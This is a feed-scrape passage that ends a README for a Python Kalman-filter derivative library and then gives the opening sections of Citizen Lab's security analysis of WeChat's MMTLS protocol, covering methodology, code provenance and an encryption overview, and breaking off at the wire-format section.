<p dir="auto"><h3 tabindex="-1" dir="auto"><code>observation_func(state)</code></h3><a id="user-content-observation_funcstate" aria-label="Permalink: observation_func(state)" href="#observation_funcstate"></a></p>
<p dir="auto">Extracts the observation from the state vector. Currently, it observes only the first element (position).</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Parameters</strong>:</p>
<ul dir="auto">
<li><code>state (np.ndarray)</code>: State vector.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Returns</strong>:</p>
<ul dir="auto">
<li><code>np.ndarray</code>: Observation vector.</li>
</ul>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto"><code>jac_observation_func(state)</code></h3><a id="user-content-jac_observation_funcstate" aria-label="Permalink: jac_observation_func(state)" href="#jac_observation_funcstate"></a></p>
<p dir="auto">Computes the Jacobian of the observation function with respect to the state vector.</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Parameters</strong>:</p>
<ul dir="auto">
<li><code>state (np.ndarray)</code>: State vector.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Returns</strong>:</p>
<ul dir="auto">
<li><code>np.ndarray</code>: Jacobian matrix of size <code>(1, n+1)</code>.</li>
</ul>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto"><code>grad(y, t, n=1, delta_t=None, obs_noise_std=1e-2)</code></h3><a id="user-content-grady-t-n1-delta_tnone-obs_noise_std1e-2" aria-label="Permalink: grad(y, t, n=1, delta_t=None, obs_noise_std=1e-2)" href="#grady-t-n1-delta_tnone-obs_noise_std1e-2"></a></p>
<p dir="auto">Main function to estimate the derivatives of the input data <code>y</code> up to order <code>n</code>.</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Parameters</strong>:</p>
<ul dir="auto">
<li><code>y (np.ndarray)</code>: Observed data array.</li>
<li><code>t (np.ndarray)</code>: Time points corresponding to <code>y</code>.</li>
<li><code>n (int)</code>: Maximum order of derivative to estimate (default is <code>1</code>).</li>
<li><code>delta_t (float, optional)</code>: Time step for the Kalman filter. If <code>None</code>, it is automatically determined.</li>
<li><code>obs_noise_std (float)</code>: Standard deviation of the observation noise.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>Returns</strong>:</p>
<ul dir="auto">
<li><code>smoother_states (List[Gaussian])</code>: List of Gaussian states containing mean and covariance estimates for each time step.</li>
<li><code>filter_times (np.ndarray)</code>: Time points corresponding to the estimates.</li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Dependencies</h2><a id="user-content-dependencies" aria-label="Permalink: Dependencies" href="#dependencies"></a></p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Python 3.x</strong></p>
</li>
<li>
<p dir="auto"><strong>NumPy</strong>: For numerical computations.</p>
</li>
<li>
<p dir="auto"><strong>Matplotlib</strong>: For plotting results.</p>
</li>
<li>
<p dir="auto"><strong>BayesFilter</strong>: For Bayesian filtering and smoothing.</p>
<p dir="auto">Install via:</p>
<div dir="auto" data-snippet-clipboard-copy-content="pip install numpy matplotlib bayesfilter"><pre>pip install numpy matplotlib bayesfilter</pre></div>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">This project is licensed under the MIT License - see the <a href="https://github.com/hugohadfield/kalmangrad/blob/main/license.txt">LICENSE</a> file for details.</p>
<hr>
<p dir="auto"><strong>Disclaimer</strong>: This code is provided as-is without any guarantees. Please test and validate the code in your specific context.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Should We Chat, Too? Security Analysis of WeChat's Mmtls Encryption Protocol (151 pts)]]></title>
            <link>https://citizenlab.ca/2024/10/should-we-chat-too-security-analysis-of-wechats-mmtls-encryption-protocol/</link>
            <guid>41863278</guid>
            <pubDate>Wed, 16 Oct 2024 20:06:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://citizenlab.ca/2024/10/should-we-chat-too-security-analysis-of-wechats-mmtls-encryption-protocol/">https://citizenlab.ca/2024/10/should-we-chat-too-security-analysis-of-wechats-mmtls-encryption-protocol/</a>, See on <a href="https://news.ycombinator.com/item?id=41863278">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="container"> <!--TODO move to stylesheet -->
		<main id="main" role="main" itemscope="" itemprop="mainContentOfPage" itemtype="http://schema.org/Blog">
			<section id="content">


						
							

     <article id="post-81063" dir="ltr" 81063role="article" itemscope="" itemprop="blogPost" itemtype="http://schema.org/BlogPosting">

        <header>
          <span dir="ltr"><a href="https://citizenlab.ca/category/research/"></a><a href="https://citizenlab.ca/category/research/">Research</a><a href="https://citizenlab.ca/category/research/app-privacy-and-security/">App Privacy and Controls</a></span>
            
            

          <!-- Display the link for the PDF version of the post -->
          
        </header>         
                <section itemprop="articleBody">
                  

<h2 id="key-contributions">Key contributions</h2>
<ul>
<li>We performed the first public analysis of the security and privacy properties of MMTLS, the main network protocol used by WeChat, an app with over one billion monthly active users.</li>
<li>We found that MMTLS is a modified version of TLS 1.3, with many of the modifications that WeChat developers made to the cryptography introducing weaknesses.</li>
<li>Further analysis revealed that earlier versions of WeChat used a less secure, custom-designed protocol that contains multiple vulnerabilities, which we describe as “Business-layer encryption”. This layer of encryption is still being used in addition to MMTLS in modern WeChat versions.</li>
<li>Although we were unable to develop an attack to completely defeat WeChat’s encryption, the implementation is inconsistent with the level of cryptography you would expect in an app used by a billion users, such as its use of deterministic IVs and lack of forward secrecy.</li>
<li>These findings contribute to a larger body of work that suggests that apps in the Chinese ecosystem fail to adopt cryptographic best practices, opting instead to invent their own, often problematic systems.</li>
<li>We are releasing technical tools and further documentation of our technical methodologies in an accompanying <a href="https://github.com/citizenlab/wechat-security-report/" target="_blank" rel="noopener">Github repository</a>. These tools and documents, along with this main report, will assist future researchers to study WeChat’s inner workings.</li>
</ul>
<h2 id="introduction">Introduction</h2>
<p>WeChat, with over <a href="https://www.messengerpeople.com/global-messenger-usage-statistics" target="_blank" rel="noopener"><u>1.2 billion monthly active users</u></a>, stands as the most popular messaging and social media platform in China and third globally. As indicated by market research, WeChat’s network traffic <a href="https://walkthechat.com/wechat-impact-report-2016/" target="_blank" rel="noopener"><u>accounted for 34%</u></a> of Chinese mobile traffic in 2018. WeChat’s dominance has monopolized messaging in China, making it increasingly unavoidable for those in China to use. With an ever-expanding array of features, WeChat has also grown beyond its original purpose as a messaging app.</p>
<p>Despite the universality and importance of WeChat, there has been little study of the proprietary network encryption protocol, MMTLS, used by the WeChat application. This knowledge gap serves as a barrier for researchers in that it hampers additional security and privacy study of such a critical application. In addition, <a href="https://citizenlab.ca/2016/02/privacy-security-issues-baidu-browser/"><u>home</u></a>–<a href="https://citizenlab.ca/2016/03/privacy-security-issues-qq-browser/"><u>rolled</u></a> <a href="https://arxiv.org/abs/1802.03367" target="_blank" rel="noopener"><u>cryptography</u></a> <a href="https://citizenlab.ca/2015/05/a-chatty-squirrel-privacy-and-security-issues-with-uc-browser/"><u>is</u></a> <a href="https://citizenlab.ca/2016/08/a-tough-nut-to-crack-look-privacy-and-security-issues-with-uc-browser/"><u>unfortunately</u></a> <a href="https://www.usenix.org/conference/foci16/workshop-program/presentation/knockel" target="_blank" rel="noopener"><u>common</u></a> <a href="https://citizenlab.ca/2020/04/move-fast-roll-your-own-crypto-a-quick-look-at-the-confidentiality-of-zoom-meetings/"><u>in</u></a> <a href="https://citizenlab.ca/2022/01/cross-country-exposure-analysis-my2022-olympics-app/"><u>many</u></a> incredibly popular Chinese applications, and there have historically <a href="https://citizenlab.ca/2023/08/vulnerabilities-in-sogou-keyboard-encryption/"><u>been</u></a> <a href="https://citizenlab.ca/2024/04/vulnerabilities-across-keyboard-apps-reveal-keystrokes-to-network-eavesdroppers/"><u>issues</u></a> with cryptosystems developed independently of well-tested standards such as TLS.</p>
<p>This work is a deep dive into the mechanisms behind MMTLS and the core workings of the WeChat program. We compare the security and performance of MMTLS to TLS 1.3 and discuss our overall findings. We also provide public documentation and tooling to decrypt WeChat network traffic. These tools and documents, along with our report, will assist future researchers to study WeChat’s privacy and security properties, as well as its other inner workings.</p>
<p>This report consists of a technical description of <a href="#launching-a-wechat-network-request">how WeChat launches a network request</a> and its <a href="#wechat-network-request-encryption">encryption protocols</a>, followed by a <a href="#security-issues">summary of weaknesses in WeChat’s protocol</a>, and finally a <a href="#discussion">high-level discussion</a> of WeChat’s design choices and their impact. The report is intended for privacy, security, or other technical researchers interested in furthering the privacy and security study of WeChat. For non-technical audiences, we have summarized our findings in this FAQ.</p>
<h3 id="prior-work-on-mmtls-and-wechat-transport-security">Prior work on MMTLS and WeChat transport security</h3>
<p>Code internal to the WeChat mobile app refers to its proprietary TLS stack as MMTLS (MM is short for MicroMessenger, which is a direct translation of 微信, the Chinese name for WeChat) and uses it to encrypt the bulk of its traffic.</p>
<p>There is limited public documentation of the MMTLS protocol. This <a href="https://github.com/WeMobileDev/article/blob/master/%E5%9F%BA%E4%BA%8ETLS1.3%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AEmmtls%E4%BB%8B%E7%BB%8D.md" target="_blank" rel="noopener"><u>technical document</u></a> from WeChat developers describes in which ways it is similar and different from TLS 1.3, and attempts to justify various decisions they made to either simplify or change how the protocol is used. In this document, there are various key differences they identify between MMTLS and TLS 1.3, which help us understand the various modes of usage of MMTLS.</p>
<p><a href="https://wenku.baidu.com/view/67762def4b35eefdc9d33374.html" target="_blank" rel="noopener"><u>Wan et al.</u></a> conducted the most comprehensive study of WeChat transport security in 2015 using standard security analysis techniques. However, this analysis was performed before the deployment of MMTLS, WeChat’s upgraded security protocol. In 2019, <a href="https://link.springer.com/chapter/10.1007/978-3-030-24268-8_27" target="_blank" rel="noopener"><u>Chen et al.</u></a> studied the login process of WeChat and specifically studied packets that are encrypted with TLS and not MMTLS.</p>
<p>As for MMTLS itself, in 2016 WeChat developers published <a href="https://github.com/WeMobileDev/article/blob/master/%E5%9F%BA%E4%BA%8ETLS1.3%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AEmmtls%E4%BB%8B%E7%BB%8D.md" target="_blank" rel="noopener"><u>a document</u></a> describing the design of the protocol at a high level that compares the protocol with TLS 1.3. Other MMTLS publications focus on <a href="https://ieeexplore.ieee.org/abstract/document/8711267" target="_blank" rel="noopener"><u>website fingerprinting-type</u></a> <a href="https://ieeexplore.ieee.org/abstract/document/8456067" target="_blank" rel="noopener"><u>attacks</u></a>, but none specifically perform a security evaluation. A few <a href="https://github.com/anonymous5l/mmtls" target="_blank" rel="noopener"><u>Github repositories</u></a> and <a href="https://bbs.pediy.com/thread-257942.htm" target="_blank" rel="noopener"><u>blog posts</u></a> look briefly into the wire format of MMTLS, though none are comprehensive. Though there has been little work studying MMTLS specifically, previous Citizen Lab reports have discovered security flaws of <a href="https://citizenlab.ca/2016/03/privacy-security-issues-qq-browser/"><u>other</u></a> <a href="https://arxiv.org/abs/1802.03367" target="_blank" rel="noopener"><u>cryptographic</u></a> protocols designed and implemented by Tencent.</p>
<h2 id="methodology">Methodology</h2>
<p>We analyzed two versions of WeChat Android app:</p>
<ul>
<li>Version 8.0.23 (APK “versionCode” 2160) released on May 26, 2022, downloaded from the WeChat website.</li>
<li>Version 8.0.21 (APK “versionCode” 2103) released on April 7, 2022, downloaded from Google Play Store.</li>
</ul>
<p>All findings in this report apply to both of these versions.</p>
<p>We used an account registered to a U.S. phone number for the analysis, which changes the behavior of the application compared to a mainland Chinese number. Our setup may not be representative of all WeChat users, and the full limitations are discussed further below.</p>
<p>For dynamic analysis, we analyzed the application installed on a rooted Google Pixel 4 phone and an emulated Android OS. We used <a href="https://frida.re/" target="_blank" rel="noopener"><u>Frida</u></a> to hook the app’s functions and manipulate and export application memory. We also performed network analysis of WeChat’s network traffic using <a href="https://www.wireshark.org/" target="_blank" rel="noopener"><u>Wireshark</u></a>. However, due to WeChat’s use of nonstandard cryptographic libraries like MMTLS, standard network traffic analysis tools that might work with HTTPS/TLS do not work for all of WeChat’s network activity. Our use of Frida was paramount for capturing the data and information flows we detail in this report. These Frida scripts are designed to intercept WeChat’s request data immediately before WeChat sends it to its MMTLS encryption module. The Frida scripts we used are published in <a href="https://github.com/citizenlab/wechat-report-data" target="_blank" rel="noopener"><u>our Github repository</u></a>.</p>
<p>For static analysis, we used <a href="https://github.com/skylot/jadx" target="_blank" rel="noopener"><u>Jadx</u></a>, a popular Android decompiler, to decompile WeChat’s Android Dex files into Java code. We also used <a href="https://ghidra-sre.org/" target="_blank" rel="noopener"><u>Ghidra</u></a> and <a href="https://hex-rays.com/ida-pro/" target="_blank" rel="noopener"><u>IDA Pro</u></a> to decompile the native libraries (written in C++) bundled with WeChat.</p>
<h2 id="notation">Notation</h2>
<p>In this report, we reference a lot of code from the WeChat app. When we reference any code (including file names and paths), we will style the text using <code>monospace fonts</code> to indicate it is code. If a function is referenced, we will add empty parentheses after the function name, like this: <code>somefunction()</code>. The names of variables and functions that we show may come from one of the three following:</p>
<ol type="1">
<li>The original decompiled name.</li>
<li>In cases where the name cannot be decompiled into a meaningful string (e.g., the symbol name was not compiled into the code), we rename it according to how the nearby internal log messages reference it.</li>
<li>In cases where there is not enough information for us to tell the original name, we name it according to our understanding of the code. In such cases, we will note that these names are given by us.</li>
</ol>
<p>In the cases where the decompiled name and log message name of functions are available, they are generally consistent. Bolded or italicized terms can refer to higher-level concepts or parameters we have named.</p>
<h2 id="utilization-of-open-source-components">Utilization of open source components</h2>
<p>We also identified open source components being used by the project, the two largest being <a href="https://openssl-library.org/" target="_blank" rel="noopener"><u>OpenSSL</u></a> and <a href="https://github.com/Tencent/mars" target="_blank" rel="noopener"><u>Tencent Mars</u></a>. Based on our analysis of decompiled WeChat code, large parts of its code are identical to Mars. Mars is an “infrastructure component” for mobile applications, providing common features and abstractions that are needed by mobile applications, such as networking and logging.</p>
<p>By compiling these libraries separately with debug symbols, we were able to import function and class definitions into Ghidra for further analysis. This helped tremendously to our understanding of other non-open-source code in WeChat. For instance, when we were analyzing the network functions decompiled from WeChat, we found a lot of them to be highly similar to the open source Mars, so we could just read the source code and comments to understand what a function was doing. What was not included in open source Mars are encryption related functions, so we still needed to read decompiled code, but even in these cases we were aided by various functions and structures that we already know from the open source Mars.</p>
<h3 id="matching-decompiled-code-to-its-source">Matching decompiled code to its source</h3>
<p>In the internal logging messages of WeChat, which contain source file paths, we noticed three top level directories, which we have highlighted below:</p>
<ul>
<li><code>/home/android/devopsAgent/workspace/p-e118ef4209d745e1b9ea0b1daa0137ab/src/<mark>mars</mark>/</code></li>
<li><code>/home/android/devopsAgent/workspace/p-e118ef4209d745e1b9ea0b1daa0137ab/src/<mark>mars-wechat</mark>/</code></li>
<li><code>/home/android/devopsAgent/workspace/p-e118ef4209d745e1b9ea0b1daa0137ab/src/<mark>mars-private</mark>/</code></li>
</ul>
<p>The source files under “mars” can all be found in the <a href="https://github.com/Tencent/mars" target="_blank" rel="noopener"><u>open source Mars repository</u></a> as well, while source files in the other two top level directories cannot be found in the open source repository. To illustrate, below is a small section of decompiled code from <code>libwechatnetwork.so</code> :</p>
<div>
<pre>    XLogger::XLogger((XLogger *)&amp;local_2c8,5,"mars::stn",

"/home/android/devopsAgent/workspace/p-e118ef4209d745e1b9ea0b1daa0137ab/src/mars/mars/stn/src/longlink.cc"
                ,"Send",0xb2,false,(FuncDef0 *)0x0);
    XLogger::Assert((XLogger *)&amp;local_2c8,"tracker_.get()");
    XLogger::~XLogger((XLogger *)&amp;local_2c8);
</pre>
</div>
<p>From its similarity, is highly likely that this section of code was compiled from <a href="https://github.com/Tencent/mars/blob/1583548111ed055836bdc2a344e45084ec775e6d/mars/stn/src/longlink.cc#L178" target="_blank" rel="noopener"><u>this line</u></a> in the Send() function, defined in longlink.cc file from the open source repository:</p>
<p><code>xassert2(tracker_.get());</code></p>
<p>Reusing this observation, whenever our decompiler is unable to determine the name of a function, we can use logging messages within the compiled code to determine its name. Moreover, if the source file is from open source Mars, we can read its source code as well.</p>
<h3 id="three-parts-of-mars">Three parts of Mars</h3>
<p>In a few articles on the <a href="https://github.com/Tencent/mars/wiki" target="_blank" rel="noopener"><u>Mars wiki</u></a>, Tencent developers provided the following motivations to develop Mars:</p>
<ul>
<li>The need for a <a href="https://cloud.tencent.com/developer/article/1005495" target="_blank" rel="noopener"><u>cross-platform</u></a> networking library, to reduce the development and maintenance costs of two separate network libraries on Android and iOS.</li>
<li>The need to <a href="http://mp.weixin.qq.com/s?__biz=MzAwNDY1ODY2OQ==&amp;mid=2649286458&amp;idx=1&amp;sn=320f690faa4f97f7a49a291d4de174a9&amp;chksm=8334c3b8b4434aae904b6d590027b100283ef175938610805dd33ca53f004bd3c56040b11fa6#rd" target="_blank" rel="noopener"><u>customize parameters of the TCP handshake process</u></a>, in order for faster connection establishment.</li>
</ul>
<p>According to its developers, Mars and its STN module are comparable to networking libraries such as <a href="https://github.com/AFNetworking/AFNetworking" target="_blank" rel="noopener"><u>AFNetworking</u></a> and <a href="https://square.github.io/okhttp/" target="_blank" rel="noopener"><u>OkHttp</u></a>, which are widely used in other mobile apps.</p>
<p><a href="https://github.com/WeMobileDev/article/blob/master/%E5%BE%AE%E4%BF%A1%E7%BB%88%E7%AB%AF%E8%B7%A8%E5%B9%B3%E5%8F%B0%E7%BB%84%E4%BB%B6%20Mars%20%E7%B3%BB%E5%88%97%20-%20%E6%88%91%E4%BB%AC%E5%A6%82%E7%BA%A6%E8%80%8C%E8%87%B3.md?plain=1" target="_blank" rel="noopener"><u>One of the technical articles</u></a> released by the WeChat development team wrote about the process of open-sourcing Mars. According to the article, they had to separate WeChat-specific code, which was kept private, from the general use code, which was open sourced. In the end, three parts were separated from each other:</p>
<ul>
<li>mars-open: to be open sourced, independent repository.</li>
<li>mars-private: potentially open sourced, depends on mars-open.</li>
<li>mars-wechat: WeChat business logic code, depends on mars-open and mars-private.</li>
</ul>
<p>These three names match the top level directories we found earlier if we take “mars-open” to be in the “mars” top-level directory. Using this knowledge, when reading decompiled WeChat code, we could easily know whether it was WeChat-specific or not. From our reading of the code, mars-open contains basic and generic structures and functions, for instance, <a href="https://github.com/Tencent/mars/blob/master/mars/comm/autobuffer.cc" target="_blank" rel="noopener"><u>buffer structures</u></a>, <a href="https://github.com/Tencent/mars/blob/6c71f72ff770f8a2b111ef27f1ccf72511801bbd/mars/comm/ini.h#L60" target="_blank" rel="noopener"><u>config stores</u></a>, <a href="https://github.com/Tencent/mars/tree/6c71f72ff770f8a2b111ef27f1ccf72511801bbd/mars/comm/unix/thread" target="_blank" rel="noopener"><u>thread management</u></a> and, most importantly, the module named “STN” responsible for network transmission. (We were unable to determine what STN stands for.) On the other hand, mars-wechat contains the MMTLS implementation, and mars-private is not closely related to the features within our research scope.</p>
<p>As a technical side note, the open source Mars <a href="https://github.com/Tencent/mars/wiki/Mars-Android-%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97#%E6%9C%AC%E5%9C%B0%E7%BC%96%E8%AF%91" target="_blank" rel="noopener"><u>compiles</u></a> to just one object file named “libmarsstn.so”. However, in WeChat, multiple shared object files reference code within the open source Mars, including the following:</p>
<ul>
<li><code>libwechatxlog.so</code></li>
<li><code>libwechatbase.so</code></li>
<li><code>libwechataccessory.so</code></li>
<li><code>libwechathttp.so</code></li>
<li><code>libandromeda.so</code></li>
<li><code>libwechatmm.so</code></li>
<li><code>libwechatnetwork.so</code></li>
</ul>
<p>Our research focuses on the transport protocol and encryption of WeChat, which is implemented mainly in libwechatmm.so and libwechatnetwork.so. In addition, we inspected libMMProtocalJni.so, which is not part of Mars but contains functions for cryptographic calculations. We did not inspect the other shared object files.</p>
<h3 id="matching-mars-versions">Matching Mars versions</h3>
<p>Despite being able to find open source code to parts of WeChat, in the beginning of our research, we were unable to pinpoint the specific version of the source code of mars-open that was used to build WeChat. Later, we found version strings contained in <code>libwechatnetwork.so</code>. For WeChat 8.0.21, searching for the string “MARS_” yielded the following:</p>
<p>MARS_BRANCH: HEAD<br>
MARS_COMMITID: d92f1a94604402cf03939dc1e5d3af475692b551<br>
MARS_PRIVATE_BRANCH: HEAD<br>
MARS_PRIVATE_COMMITID: 193e2fb710d2bb42448358c98471cd773bbd0b16<br>
MARS_URL:<br>
MARS_PATH: HEAD<br>
MARS_REVISION: d92f1a9<br>
MARS_BUILD_TIME: 2022-03-28 21:52:49<br>
MARS_BUILD_JOB: rb/2022-MAR-p-e118ef4209d745e1b9ea0b1daa0137ab-22.3_1040</p>
<p>The specific MARS_COMMITID (d92f1a…) exists in the open source Mars repository. This version of the source code also matches the decompiled code.</p>
<p>Pinpointing the specific source code version helped us tremendously with Ghidra’s decompilation. Since a lot of the core data structures used in WeChat are from Mars, by importing the known data structures, we can observe the non-open-sourced code accessing structure fields, and inferring its purpose.</p>
<h2 id="limitations">Limitations</h2>
<p>This investigation only looks at client behavior and is therefore subject to other common limitations in privacy research that can only perform client analysis. Much of the data that the client transmits to WeChat servers may be required for functionality of the application. For instance, WeChat servers can certainly see chat messages since WeChat can censor them according to their content. We cannot always measure what Tencent is doing with the data that they collect, but we can make inferences about what is possible. <a href="https://citizenlab.ca/2020/05/we-chat-they-watch/"><u>Previous work</u></a> has made certain limited inferences about data sharing, such as that messages sent by non-mainland-Chinese users are used to train censorship algorithms for mainland Chinese users. In this report, we focus on the version of WeChat for non-mainland-Chinese users.</p>
<p>Our investigation was also limited due to legal and ethical constraints. It has become increasingly difficult to obtain Chinese phone numbers for investigation due to the strict phone number and associated government ID requirements. Therefore, we did not test on Chinese phone numbers, which causes WeChat to behave differently. In addition, without a mainland Chinese account, the types of interaction with certain features and Mini Programs were limited. For instance, we did not perform financial transactions on the application.</p>
<p>Our primary analysis was limited to analyzing only two versions of WeChat Android (8.0.21 and 8.0.23). However, we also re-confirmed our tooling works on WeChat 8.0.49 for Android (released April 2024) and that the MMTLS network format matches that used by WeChat 8.0.49 for iOS. Testing different versions of WeChat, the backwards-compatibility of the servers with older versions of the application, and testing on a variety of Android operating systems with variations in API version, are great avenues for future work.</p>
<p>Within the WeChat Android app, we focused on its networking components. Usually, within a mobile application (and in most other programs as well), all other components will defer the work of communicating over the network to the networking components. Our research is not a complete security and privacy audit of the WeChat app, as even if the network communication is properly protected, other parts of the app still need to be secure and private. For instance, an app would not be secure if the server accepts any password to an account login, even if the password is confidentially transmitted.</p>

<p>In the <a href="https://github.com/citizenlab/wechat-security-report/" target="_blank" rel="noopener"><u>Github repository</u></a>, we have released tooling that can log keys using Frida and decrypt network traffic that is captured during the same period of time, as well as samples of decrypted payloads. In addition, we have provided additional documentation and our reverse-engineering notes from studying the protocol. We hope that these tools and documentation will further aid researchers in the study of WeChat.</p>
<h2 id="launching-a-wechat-network-request">Launching a WeChat network request</h2>
<p>As with any other apps, WeChat is composed of various components. Components within WeChat can invoke the networking components to send or receive network transmissions. In this section, we provide a highly simplified description of the process and components surrounding sending a network request in WeChat. The actual process is much more complex, which we explain in more detail in a <a href="https://github.com/citizenlab/wechat-security-report/blob/main/docs/networking_components.md" target="_blank" rel="noopener"><u>separate document</u></a>. The specifics of data encryption is discussed in the next section “WeChat network request encryption”.</p>
<p>In the WeChat source code, each API is referred to as a different “Scene”. For instance, during the registration process, there is one API that submits all new account information provided by the user, called <code>NetSceneReg</code>. <code>NetSceneReg</code> is referred to by us as a “Scene class”, Other components could start a network request towards an API by calling the particular Scene class. In the case of <code>NetSceneReg</code>, it is usually invoked by a click event of a button UI component.</p>
<p>Upon invocation, the Scene class would prepare the request data. The structure of the request data (as well as the response) is defined in “RR classes”. (We dub them RR classes because they tend to have “ReqResp” in their names.) Usually, one Scene class would correspond to one RR class. In the case of <code>NetSceneReg</code>, it corresponds to the RR class <code>MMReqRespReg2</code>, and contains fields like the desired username and phone number. For each API, its RR class also defines a unique internal URI (usually starting with “/cgi-bin”) and a “request type” number (an approximately 2–4 digit integer). The internal URI and request type number is often used throughout the code to identify different APIs. Once the data is prepared by the Scene class, it is sent to <code>MMNativeNetTaskAdapter</code>.</p>
<p><code>MMNativeNetTaskAdapter</code> is a task queue manager, it manages and monitors the progress of each network connection and API requests. When a Scene Class calls <code>MMNativeNetTaskAdapter</code>, it places the new request (a task) onto the task queue, and calls the req2Buf() function. req2Buf() serializes the request <a href="https://protobuf.dev/" target="_blank" rel="noopener"><u>Protobuf</u></a> object that was prepared by the Scene Class into bytes, then encrypts the bytes using <em>Business-layer Encryption</em>.</p>
<p>Finally, the resultant ciphertext from Business-layer encryption is sent to the “STN” module, which is part of Mars. STN then encrypts the data again using <em>MMTLS Encryption</em>. Then, STN establishes the network transport connection, and sends the MMTLS Encryption ciphertext over it. In STN, there are two types of transport connections: <em>Shortlink</em> and <em>Longlink</em>. Shortlink refers to an HTTP connection that carries MMTLS ciphertext. Shortlink connections are closed after one request-response cycle. Longlink refers to a long-lived TCP connection. A Longlink connection can carry multiple MMTLS encrypted requests and responses without being closed.</p>
<h2 id="wechat-network-request-encryption">WeChat network request encryption</h2>
<p>WeChat network requests are encrypted twice, with different sets of keys. Serialized request data is first encrypted using what we call the <em>Business-layer Encryption</em>, as internal encryption is referred to in this <a href="https://github.com/WeMobileDev/article/blob/master/%E5%9F%BA%E4%BA%8ETLS1.3%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AEmmtls%E4%BB%8B%E7%BB%8D.md" target="_blank" rel="noopener"><u>blog post</u></a> as occurring at the <strong>“</strong>Business-layer<strong>”</strong>. The Business-layer Encryption has two modes: <em>Symmetric Mode</em> and <em>Asymmetric Mode</em>. The resultant Business-layer-encrypted ciphertext is appended to metadata about the Business-layer request. Then, the Business-layer requests (i.e., request metadata and inner ciphertext) are additionally encrypted, using <em>MMTLS Encryption</em>. The final resulting ciphertext is then serialized as an <em>MMTLS Request</em> and sent over the wire.</p>
<p>WeChat’s network encryption system is disjointed and seems to still be a combination of at least three different cryptosystems. The encryption process described in the Tencent documentation mostly matches our findings about MMTLS Encryption, but the document does not seem to describe in detail the Business-layer Encryption<strong>,</strong> whose operation differs when <strong>logged-in</strong> and when <strong>logged-out</strong>. Logged-in clients use Symmetric Mode while logged-out clients use Asymmetric Mode. We also observed WeChat utilizing HTTP, HTTPS, and QUIC to transmit large, static resources such as translation strings or transmitted files. The endpoint hosts for these communications are different from MMTLS server hosts. Their domain names also suggest that they belong to <a href="https://en.wikipedia.org/wiki/Content_delivery_network" target="_blank" rel="noopener"><u>CDNs</u></a>. However, the endpoints that are interesting to us are those that download dynamically generated, often confidential resources (i.e., generated by the server on every request) or endpoints where users transmit, often confidential, data to WeChat’s servers. These types of transmissions are made using MMTLS.</p>
<p>As a final implementation note, WeChat, across all these cryptosystems, uses internal OpenSSL bindings that are compiled into the program. In particular, the libwechatmm.so library seems to have been compiled with <a href="https://mta.openssl.org/pipermail/openssl-announce/2021-August/000206.html" target="_blank" rel="noopener"><u>OpenSSL version 1.1.1l</u></a>, though the other libraries that use OpenSSL bindings, namely <code>libMMProtocalJni.so</code> and <code>libwechatnetwork.so</code> were not compiled with the OpenSSL version strings. We note that OpenSSL internal APIs can be confusing and are often <a href="https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf" target="_blank" rel="noopener"><u>misused</u></a> by well-intentioned developers. Our full notes about each of the OpenSSL APIs that are used can be found in the <a href="https://github.com/citizenlab/wechat-security-report/blob/main/docs/reversing-notes.md" target="_blank" rel="noopener"><u>Github repository</u></a>.</p>
<p>In Table 1, we have summarized each of the relevant cryptosystems, how their keys are derived, how encryption and authentication are achieved, and which libraries contain the relevant encryption and authentication functions. We will discuss cryptosystem’s details in the coming sections.</p>
<figure><table>
<thead>
<tr>
<th></th>
<th><strong>Key derivation</strong></th>
<th><strong>Encryption</strong></th>
<th><strong>Authentication</strong></th>
<th><strong>Library</strong></th>
<th><strong>Functions that perform the symmetric encryption</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>MMTLS, Longlink</strong></td>
<td>Diffie-Hellman (DH)</td>
<td>AES-GCM</td>
<td>AES-GCM tag</td>
<td><code>libwechatnetwork.so</code></td>
<td><code>Crypt()</code></td>
</tr>
<tr>
<td><strong>MMTLS, Shortlink</strong></td>
<td>DH with session resumption</td>
<td>AES-GCM</td>
<td>AES-GCM tag</td>
<td><code>libwechatnetwork.so</code></td>
<td><code>Crypt()</code></td>
</tr>
<tr>
<td><strong>Business-layer, Asymmetric Mode</strong></td>
<td>Static DH with fresh client keys</td>
<td>AES-GCM</td>
<td>AES-GCM tag</td>
<td><code>libwechatmm.so</code></td>
<td><code>HybridEcdhEncrypt(),</code> <code>AesGcmEncryptWithCompress()</code></td>
</tr>
<tr>
<td><strong>Business-layer, Symmetric Mode</strong></td>
<td>Fixed key from server</td>
<td>AES-CBC</td>
<td>Checksum + MD5</td>
<td><code>libMMProtocalJNI.so</code></td>
<td><code>pack(), EncryptPack(), genSignature()</code></td>
</tr>
</tbody>
</table></figure>
<p><em>Table 1: Overview of different cryptosystems for WeChat network request encryption, how keys are derived, how encryption and authentication are performed, and which libraries perform them.</em></p>
<h2 id="mmtls-wire-format">1. MMTLS Wire Format</h2>
<p>Since MMTLS can go over various transports, we refer to an <em>MMTLS packet</em> as a unit of correspondence within MMTLS. Over Longlink, MMTLS packets can be split across multiple TCP packets. Over Shortlink, MMTLS packets are generally contained within an HTTP POST request or response body.<a id="fnref1" role="doc-noteref" href="#fn1"><sup>1</sup></a></p>
